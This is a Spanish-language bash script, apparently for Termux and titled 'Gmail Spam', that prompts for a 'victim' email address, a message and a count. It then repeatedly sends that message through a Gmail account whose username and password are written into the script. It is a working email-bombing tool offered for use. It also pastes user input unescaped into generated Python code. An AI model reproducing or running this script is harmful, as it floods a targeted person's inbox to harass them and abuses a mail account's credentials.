#!/bin/bash
if [ -f correo.py ]; then
	rm correo.py > /dev/null 2>&1
fi
sleep 3

clear
printf "\e[1;31m"
figlet -t Gmail
printf "\e[1;30m"
figlet -t Spam
printf "\e[1;32m"
figlet -t Termux
sleep 2
printf "\e[1;30m    Created by: \e[1;36mHACKED \e[1;30mand \e[1;36mAD \e[0m\n"|pv -qL 12
sleep 1
printf "\n\e[1;33mIngrese el correo de la víctima:\e[1;37m "
read -r correo
sleep 1
printf "\e[1;33mIngrese el mensaje de la víctima:\e[1;37m "
read -r mensaje
sleep 1
printf "\e[1;33mIngrese la cantidad  de spam a la víctima:\e[1;37m "
read -r finalizar
sleep 3
echo "#!/bin/python" >> correo.py
echo "import smtplib" >> correo.py

echo "mensaje = '$mensaje'" >> correo.py
echo "server = smtplib.SMTP_SSL('smtp.gmail.com', 465)" >> correo.py
echo "server.login('darktrojanspam', 'DarkTrojanSpam')" >> correo.py
echo "server.sendmail('darktrojanspam@gmail.com', '$correo', mensaje)" >> correo.py
echo "server.quit()" >> correo.py

echo "print ('El mensaje fue enviado')" >> correo.py
echo ""
printf "\e[1;36mPresiona enter para mandar el spam ^^ "
read
printf "\e[1;30m"
iniciar=0
while [ $iniciar -lt $finalizar ]
do
        python3 correo.py
        sleep 0.1
        let iniciar=iniciar+1
done
echo ""
sleep 3
printf "\e[1;34m[\e[1;32m+\e[1;34m]\e[1;37mSe han enviado \e[1;31m$finalizar\e[1;37m mensajes de spam al correo:\e[1;32m$correo\e[1;37m exitosamente!!\n"|pv -qL 12
sleep 2
printf "\n\e[1;34m[\e[1;32m+\e[1;34m]\e[1;30m    Created by: \e[1;36mHACKED \e[1;30mand \e[  AD \n"|pv -qL 12